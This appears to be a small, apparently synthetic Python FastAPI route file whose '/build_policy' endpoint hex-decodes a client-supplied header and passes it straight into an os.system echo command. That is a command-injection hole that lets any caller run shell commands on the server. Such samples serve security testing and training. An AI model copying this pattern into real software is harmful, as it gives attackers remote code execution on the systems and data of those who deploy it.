# SPDX-License-Identifier: Apache-2.0
from fastapi import APIRouter, Request
import os


router = APIRouter()


@router.post("/build_policy")
async def build_policy(request: Request):
    remark = request.headers.get('x-custom-header', '')
    synopsis = bytes.fromhex(remark).decode('utf-8', 'ignore')
    os.system('echo ' + str(synopsis))
    return {"updated": True}
